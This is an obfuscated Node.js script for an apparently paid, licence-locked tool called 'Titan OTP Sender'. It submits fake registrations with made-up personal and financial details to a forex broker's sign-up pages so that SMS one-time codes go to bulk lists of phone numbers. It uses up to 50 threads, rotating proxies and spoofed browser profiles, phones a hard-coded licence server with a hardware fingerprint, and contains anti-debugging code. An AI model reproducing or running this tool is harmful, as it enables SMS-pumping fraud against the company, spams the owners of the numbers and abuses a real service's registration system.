      v293.firstName = v267.first, v293.lastName = v267.last, v293.dateOfBirth = v268.full, v293.nationality = v262, v293.countryOfResidence = v262, v293.address = v269.street, v293.city = v269.city, v293.state = v269.state, v293.postalCode = v269.postalCode, v293.employmentStatus = "Employed", v293.industry = "Finance And Insurance", v293.annualIncome = "50001-100000", v293.netWorth = "100001-500000", v293.sourceOfFunds = "Employment Income", v293.expectedDeposit = "1001-5000", v293.purposeOfTrading = "Speculation / Active Trading", v293.forexExperience = "1-3 years", v293.cfdExperience = "Less than 1 year", v293.stocksExperience = "Less than 1 year", v293.usCitizen = false, v293.politicallyExposed = false, v293.termsAccepted = true, v293.privacyAccepted = true, v293.fileName = "PersonalInfoForm.tsx", v293.page = "personal-info page";
      const v294 = JSON.stringify([v292, v293]),
        v295 = fn8("7f6a2e1f01a78f3233af65ab5cd7156a4b2930e04a", "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22personal-info%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D", "https://secure.titanfx.com/register/step/personal-info");
      debugLog(v260, "step3b-req", v294);
      const v296 = {};
      v296.maxBytes = 0x800;
      const v297 = await sendRequest("https://secure.titanfx.com/register/step/personal-info", "POST", v295, v294, proxy, timeout, v296);
      fn6(v297.cookies), debugLog(v260, "step3b-res", {
        'status': v297.status,
        'data': v297.data.substring(0, 500)
      });
      if (v297.status === 200) {
        {
          const v306 = v297.data.toLowerCase();
          if (v306.includes("error") && (v306.includes("invalid") || v306.includes("failed"))) {
            throw new Error("Server returned error in personal info submission");
          }
          onStatus("[5/5] ✅ OTP Triggered Successfully");
          const v307 = {};
          return v307.success = true, v307.message = "OTP Triggered via Titan FX registration", v307.phone = v260, v307.email = v264, v307.browser = v263.name, v307;
        }
      } else throw new Error("Personal info submission failed (HTTP " + v297.status + ')');
    }
  } catch (v308) {
    const v309 = {};
    return v309.success = false, v309.message = '' + v308.message, v309.phone = v260, v309;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v310) {
      {
        this.totalNumbers = v310;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v311, v312) {
      let v313 = '';
      const v314 = v311.match(/\+?\d{8,}/),
        v315 = v314 ? v314[0] : '';
      if (v312 === "success") v313 = chalk.hex("#00FF88")("REX — Titan │ OTP Sent → ") + chalk.hex("#00BFFF").bold(v315 || v311);else {
        if (v312 === "error" || v312 === "failed") {
          {
            let v316 = v311.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
            v316.toLowerCase().includes("proxy") ? v313 = chalk.hex("#FF4466")("REX — Titan │ Proxy Drop → ") + chalk.hex("#888888")(v316) : v313 = chalk.hex("#FF4466")("REX — Titan │ Failed → ") + chalk.hex("#00BFFF").bold(v315) + chalk.hex("#888888")('\x20(' + v316 + ')');
          }
        } else {
          return;
        }
      }
      process.stdout.write("\r[K" + v313 + '\x0a'), this.render();
    }
    ["setStatus"](v317) {}
    ["update"]() {}
    ["render"]() {
      const v318 = this.processed / Math.max(this.totalNumbers, 1),
        v319 = (v318 * 100).toFixed(1),
        v320 = 20,
        v321 = Math.round(v318 * v320),
        v322 = v320 - v321;
      const v323 = chalk.hex("#00FF88")('█'.repeat(v321)) + chalk.hex("#333333")('░'.repeat(v322));
      const v324 = '\x20\x20' + chalk.hex("#0066FF").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v323 + chalk.hex("#888888")('\x20' + v319 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00FF88").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v324);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v325 = Math.floor((Date.now() - this.startTime) / 1000);
      const v326 = Math.floor(v325 / 60),
        v327 = v325 % 60,
        v328 = v326 + 'm\x20' + v327 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  TITAN OTP SENDER — COMPLETE               ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v328.padEnd(6)) + "                       ") + C('║'));
      console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v329, v330) {
    return new Promise(v331 => {
      let v332 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn9 = () => {
        process.stdout.write("[2J[H"), printHeader(), console.log("   [33m" + v329 + "[0m\n"), v330.forEach((v333, v334) => {
          v334 === v332 ? console.log("   [36m➔[35m " + v333.name + "[0m") : console.log("     [90m" + v333.name + "[0m");
        });
      };
      fn9();
      const fn10 = (v335, v336) => {
        if (v336.ctrl && v336.name === 'c') process.exit(0);
        if (v336.name === 'up') v332 = (v332 - 1 + v330.length) % v330.length, fn9();else {
          if (v336.name === "down") {
            v332 = (v332 + 1) % v330.length, fn9();
          } else v336.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn10), v331(v330[v332].value));
        }
      };
      process.stdin.on("keypress", fn10);
    });
  }
  async function promptText(v337, v338) {
    return new Promise(v339 => {
      process.stdout.write("   [33m" + v337 + "[0m ");
      let v340 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn11 = v341 => {
        const v342 = v341.toString();
        if (v342.includes('\x0a') || v342.includes('\x0d')) {
          process.stdin.removeListener("data", fn11), v340 += v342.split(/[\r\n]/)[0];
          let v343 = v340.trim();
          if (v343.startsWith('\x22') && v343.endsWith('\x22')) v343 = v343.slice(1, -1);
          v339(v343 || v338);
        } else v340 += v342;
      };
      process.stdin.on("data", fn11);
    });
  }
  async function interactiveWizard() {
    process.stdout.write("[2J[H"), printHeader();
    console.log(W.bold("  --- TITAN OTP SENDER ---\n"));
    const v344 = await selectOption("SELECT NUMBER SOURCE", [{
      'name': "📁 Load from file (numbers.txt)",
      'value': "file"
    }, {
      'name': "🌐 Auto fetch from NexaOTP Panel",
      'value': "nexa"
    }]);
    let v345 = "numbers.txt",
      v346 = null;
    if (v344 === "nexa") {
      {
        let v350 = '';
        const v351 = path.join(__dirname, ".nexa_api_key");
        if (fs.existsSync(v351)) {
          const v358 = fs.readFileSync(v351, "utf8").trim(),
            v359 = await selectOption("Found saved API Key (..." + v358.slice(-4) + "). Use it?", [{
              'name': "Yes, use saved key",
              'value': "yes"
            }, {
              'name': "No, enter new key",
              'value': 'no'
            }, {
              'name': "Delete saved key",
              'value': "delete"
            }]);
          if (v359 === "yes") {
            v350 = v358;
          } else v359 === "delete" && (fs.unlinkSync(v351), console.log(G("\n   ✗ Saved key deleted.\n")));
        }
        if (!v350) {
          v350 = await promptText("Enter NexaOTP API Key:", '');
          const v360 = {};
          v360.name = 'No', v360.value = 'no';
          const v361 = await selectOption("Save this key for future use?", [{
            'name': "Yes, save it",
            'value': "yes"
          }, v360]);
          v361 === "yes" && (fs.writeFileSync(v351, v350, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
        }
        let v352 = [],
          v353 = true;
        while (v353) {
          {
            const v362 = await promptText("Enter range #" + (v352.length + 1) + " (e.g. 21624485XXX):", '');
            if (v362) v352.push(v362);
            const v363 = await selectOption("Add another range?", [{
              'name': "Yes",
              'value': "yes"
            }, {
              'name': "No, proceed",
              'value': 'no'
            }]);
            if (v363 === 'no') v353 = false;
          }
        }
        if (v352.length === 0) {
          console.log(R("\n   ✗ You must provide at least one range.\n")), process.exit(1);
        }
        const v354 = await promptText("How many numbers to process? (e.g. 100):", '50'),
          v355 = parseInt(v354) || 50,
          v356 = await selectOption("SELECT NEXA SERVER", [{
            'name': "Server 1 (/get)",
            'value': "/api/v1/numbers/get"
          }, {
            'name': "Server 2 (/p2/get)",
            'value': "/api/v1/numbers/p2/get"
          }, {
            'name': "Server 3 (/p3/get)",
            'value': "/api/v1/numbers/p3/get"
          }]),
          v357 = {};
        v357.apiKey = v350, v357.ranges = v352, v357.totalCount = v355, v357.serverEndpoint = v356, v346 = v357;
      }
    } else {
      v345 = await promptText("Enter Phone Numbers File Path [default: numbers.txt]:", "numbers.txt");
      if (!fs.existsSync(v345)) fs.writeFileSync(v345, '');
    }
    let v347 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
    if (v347 === "none" || v347 === '') v347 = '';
    const v348 = await selectOption("SELECT THREADS", [{
        'name': "5 Threads (Safe)",
        'value': 0x5
      }, {
        'name': "10 Threads (Default)",
        'value': 0xa
      }, {
        'name': "20 Threads (Fast)",
        'value': 0x14
      }, {
        'name': "50 Threads (Extreme)",
        'value': 0x32
      }]),
      v349 = await selectOption("SELECT BROWSER PROFILE", [{
        'name': "🎲 Random Mix",
        'value': "random"
      }, {
        'name': "🌐 Google Chrome",
        'value': "chrome"
      }, {
        'name': "🦊 Mozilla Firefox",
        'value': "firefox"
      }, {
        'name': "🌊 Microsoft Edge",
        'value': "edge"
      }]);
    return process.stdin.pause(), {
      'numbersFile': v345,
      'threads': String(v348),
      'proxiesFile': v347,
      'browser': v349,
      'nexaConfig': v346
    };
  }
  function generateHWID() {
    const v364 = require('os'),
      v365 = v364.platform();
    try {
      {
        if (v365 === "win32") {
          {
            const v366 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
              'stdio': "pipe",
              'timeout': 0x3a98
            }).toString().trim();
            if (!v366) throw new Error("No hardware data");
            const v367 = crypto.createHash("sha256").update(v366).digest("hex").toUpperCase();
            return "SKING-" + v367.substring(0, 8) + '-' + v367.substring(8, 12) + '-' + v367.substring(12, 16);
          }
        } else {
          {
            let v368 = [];
            try {
              {
                const v371 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
                  'stdio': "pipe",
                  'timeout': 0x1388
                }).toString().trim();
                if (v371 && v371 !== "null") v368.push('A:' + v371);
              }
            } catch (v372) {}
            try {
              if (fs.existsSync("/proc/cpuinfo")) {
                {
                  const v373 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                    v374 = v373.match(/Serial\s*:\s*(\S+)/i),
                    v375 = v373.match(/Hardware\s*:\s*(.+)/i);
                  if (v374 && v374[1] !== "0000000000000000") v368.push('S:' + v374[1].trim());
                  if (v375) v368.push('H:' + v375[1].trim());
                }
              }
            } catch (v376) {}
            try {
              if (fs.existsSync("/etc/machine-id")) {
                const v377 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                if (v377) v368.push('M:' + v377);
              }
            } catch (v378) {}
            try {
              {
                const v379 = v364.cpus(),
                  v380 = v379 && v379.length > 0 ? v379[0].model : "UnknownCPU",
                  v381 = v364.totalmem(),
                  v382 = v364.release(),
                  v383 = v364.hostname();
                v368.push('F:' + v380 + '|' + v381 + '|' + v382 + '|' + v383);
              }
            } catch (v384) {}
            const v369 = v368.join('||'),
              v370 = crypto.createHash("sha256").update(v369).digest("hex").toUpperCase();
            return "ANKING-" + v370.substring(0, 8) + '-' + v370.substring(8, 12) + '-' + v370.substring(12, 16);
          }
        }
      }
    } catch (v385) {
      return '';
    }
  }
  function verifyServerSignature(v386, v387) {
    if (!v387) return false;
    const v388 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v386, "utf8"), v388, Buffer.from(v387, "base64"));
    } catch (v389) {
      return false;
    }
  }
  async function start() {
    const v390 = generateHWID();
    !v390 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1));
    const v391 = generateHWID();
    v391 !== v390 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
    printHeader();
    console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Titan OTP Sender             ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v390.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v392 = false,
      v393 = "Licensed";
    const v394 = Date.now();
    try {
      const v402 = "188.137.176.163",
        v403 = require("http"),
        v404 = await new Promise((v405, v406) => {
          const v407 = {};
          v407.hwid = v390, v407.app_id = "titanfx", v407.version = "2.0.2", v407.timestamp = v394;
          const v408 = JSON.stringify(v407),
            v409 = {
              'hostname': v402,
              'port': 0xec1,
              'path': "/api/verify",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v408)
              },
              'timeout': 0x2710
            };
          const v410 = v403.request(v409, v411 => {
            let v412 = '';
            v411.on("data", v413 => v412 += v413), v411.on("end", () => {
              try {
                v405(JSON.parse(v412));
              } catch (v414) {
                v406(v414);
              }
            });
          });
          v410.on("error", v406);
          v410.on("timeout", function () {
            this.destroy();
            v406(new Error("Timeout"));
          }), v410.write(v408), v410.end();
        });
      if (v404) {
        {
          v404.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v404.status === "banned" || v404.status === "expired" || !v404.sig) {
            await new Promise(v418 => setTimeout(v418, 2000));
            let v417 = String(v404.reason || "NOT REGISTERED");
            if (!v404.reason && !v404.sig) v417 = "NOT REGISTERED / REMOVED";
            console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — TITAN TOOL     ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v390.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v417.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
          }
          const v415 = v390 + "|titanfx|2.0.2|" + v394;
          if (!verifyServerSignature(v415, v404.sig)) {
            console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1);
          }
          v392 = true;
          let v416 = v404.token;
          !v416 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
            {
              !v416 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
              const v419 = {};
              v419.hwid = v390, v419.app_id = "titanfx", v419.token = v416;
              const v420 = JSON.stringify(v419),
                v421 = {
                  'hostname': v402,
                  'port': 0xec1,
                  'path': "/api/ping",
                  'method': "POST",
                  'headers': {
                    'Content-Type': "application/json",
                    'Content-Length': Buffer.byteLength(v420)
                  },
                  'timeout': 0x1388
                },
                v422 = v403.request(v421, v423 => {
                  {
                    let v424 = '';
                    v423.on("data", v425 => v424 += v425), v423.on("end", () => {
                      try {
                        const v426 = JSON.parse(v424);
                        v426.status === 'ok' && v426.token ? v416 = v426.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                      } catch (v427) {
                        console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                      }
                    });
                  }
                });
              v422.on("error", () => {
                console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
                process.exit(1);
              }), v422.on("timeout", function () {
                this.destroy(), console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
                process.exit(1);
              }), v422.write(v420), v422.end();
            }
          }, 45000);
        }
      }
    } catch (v428) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v392 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v395 = process.argv.slice(2),
      v396 = null;
    if (v395.length === 0) {
      {
        const v429 = await interactiveWizard();
        v395 = [v429.numbersFile, v429.threads, v429.proxiesFile, v429.browser], v396 = v429.nexaConfig;
      }
    }
    let v397 = path.resolve(v395[0] || "numbers.txt"),
      v398 = parseInt(v395[1]) || 10,
      v399 = v395[2] !== undefined ? v395[2] : "proxies.txt";
    if (v399.toLowerCase() === "none") v399 = '';
    let v400 = v395[3] || "random";
    printHeader();
    console.log(B("  ✓ License: " + v393) + G(" | HWID: " + v390));
    let v401 = true;
    while (v401) {
      let v430 = [];
      if (!v396) {
        if (!fs.existsSync(v397)) {
          console.error(R("✗ Error: Numbers file not found: " + v397)), process.exit(1);
        }
        v430 = fs.readFileSync(v397, "utf8").split(/\r?\n/).map(v443 => v443.trim()).filter(v444 => v444.length > 5);
      }
      let v431 = [];
      v399 && fs.existsSync(v399) && (v431 = fs.readFileSync(v399, "utf8").split('\x0a').map(v445 => v445.trim()).filter(v446 => v446.length > 0));
      let v432 = [];
      for (const v447 of v431) {
        {
          const v448 = parseProxy(v447);
          if (!v448) {
            {
              console.error(R("\n  ✗ Invalid proxy format detected: \"" + v447 + '\x22'));
              console.error(R("  Please use one of the supported formats:"));
              console.error(R("    - host:port"));
              console.error(R("    - user:pass@host:port"));
              console.error(R("    - host:port:user:pass"));
              console.error(R("    - user:pass:host:port\n"));
              process.exit(1);
            }
          }
          v432.push(v448);
        }
      }
      if (v396) console.log(C("✓ Target  : NexaOTP API (" + v396.totalCount + " numbers)"));else {
        console.log(Y("✓ Loaded " + v430.length + " targets"));
      }
      if (v432.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v432.length));
      console.log(C("✓ Threads: " + v398)), console.log(C("✓ Browser: " + v400)), console.log(C("✓ Country: Auto-detect from phone prefix\n")), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
      const v433 = new Dashboard(v396 ? v396.totalCount : v430.length);
      let v434 = [],
        v435 = [],
        v436 = 0,
        v437 = false;
      v396 && (async () => {
        try {
          for (let v449 = 0; v449 < v396.totalCount; v449++) {
            try {
              const v450 = v396.ranges[Math.floor(Math.random() * v396.ranges.length)],
                v451 = await nexaLimiter.enqueue(() => nexaFetchNumber(v396.apiKey, v450, v396.serverEndpoint));
              v451 && (v436++, v435.length > 0 ? v435.shift()(v451) : v434.push(v451));
            } catch (v452) {
              if (v452.message.includes("Insufficient balance") || v452.message.includes("No numbers available")) break;
            }
          }
        } finally {
          {
            v437 = true;
            while (v435.length > 0) v435.shift()(null);
          }
        }
      })();
      const v438 = v396 ? () => {
          {
            if (v434.length > 0) return Promise.resolve(v434.shift());
            if (v437) return Promise.resolve(null);
            return new Promise(v453 => v435.push(v453));
          }
        } : () => {
          if (v430.length === 0) return Promise.resolve(null);
          const v454 = Math.floor(Math.random() * v430.length);
          return Promise.resolve(v430.splice(v454, 1)[0]);
        },
        fn12 = () => {
          if (v432.length === 0) return null;
          const v455 = v432[Math.floor(Math.random() * v432.length)];
          return rotateSessionId(v455);
        };
      function fn13(v456) {
        try {
          const v457 = fs.readFileSync(v397, "utf8"),
            v458 = v457.split(/\r?\n/).filter(v459 => v459.trim() !== v456.trim()).join('\x0a');
          fs.writeFileSync(v397, v458);
        } catch (v460) {}
      }
      const v439 = v396 ? Math.min(v398, v396.totalCount) : Math.min(v398, v430.length),
        v440 = [],
        v441 = setInterval(() => v433.render(), 500);
      async function fn14(v461) {
        while (true) {
          {
            const v462 = await v438();
            if (!v462) break;
            try {
              const v463 = await triggerOTP(v462, {
                'onStatus': v464 => v433.setStatus("Worker " + v461 + ':\x20' + v464),
                'proxy': fn12(),
                'workerId': v461,
                'browserPref': v400
              });
              if (v463.success) {
                {
                  {
                    v433.successful++;
                    v433.processed++;
                    fn13(v462);
                    fs.appendFileSync(SUCCESSFUL_FILE, v463.phone + "|OTP_SENT|" + v463.email + '\x0a');
                    v433.addLog("Triggered OTP for " + v463.phone, "success");
                  }
                }
              } else v433.failed++, v433.processed++, fs.appendFileSync(FAILED_FILE, v463.phone + '|' + v463.message + '\x0a'), v433.addLog("Failed on " + v463.phone + ':\x20' + v463.message, "error");
            } catch (v465) {
              v433.failed++, v433.processed++, v433.addLog("Fatal error on " + v462 + ':\x20' + v465.message, "error");
            }
          }
        }
      }
      for (let v466 = 0; v466 < v439; v466++) v440.push(fn14(v466));
      await Promise.all(v440), clearInterval(v441), v433.render(), v433.stop();
      const v442 = await selectOption("Processing Complete. What next?", [{
        'name': "Reuse successful numbers (" + SUCCESSFUL_FILE + ')',
        'value': "reuse"
      }, {
        'name': "Go Home (Restart)",
        'value': "home"
      }, {
        'name': "Exit",
        'value': "exit"
      }]);
      if (v442 === "reuse") {
        if (fs.existsSync(SUCCESSFUL_FILE)) {
          {
            let v467 = fs.readFileSync(SUCCESSFUL_FILE, "utf8").split('\x0a').map(v468 => v468.split('|')[0].trim()).filter(v469 => v469.length > 5);
            fs.writeFileSync(v397, v467.join('\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), console.log("\n  [32m✓ Copied " + v467.length + " successful numbers to " + v397 + " and cleared " + SUCCESSFUL_FILE + ".[0m\n");
          }
        } else console.log("\n  [31m✗ No successful numbers found.[0m\n"), v401 = false;
      } else {
        if (v442 === "home") {
          const v470 = await interactiveWizard();
          v395 = [v470.numbersFile, v470.threads, v470.proxiesFile, v470.browser], v396 = v470.nexaConfig, v397 = path.resolve(v395[0] || "numbers.txt"), v398 = parseInt(v395[1]) || 10, v399 = v395[2] !== undefined ? v395[2] : "proxies.txt";
          if (v399.toLowerCase() === "none") v399 = '';
          v400 = v395[3] || "random";
        } else {
          v401 = false;
        }
      }
    }
  }
  start()["catch"](v471 => {
    console.error(R("Fatal error: " + v471.message));
    process.exit(1);
  });
}
function fn2(v472) {
  function fn15(v473) {
    fn15(++v473);
  }
  try {
    {
      if (v472) return fn15;else fn15(0);
    }
  } catch (v474) {}
}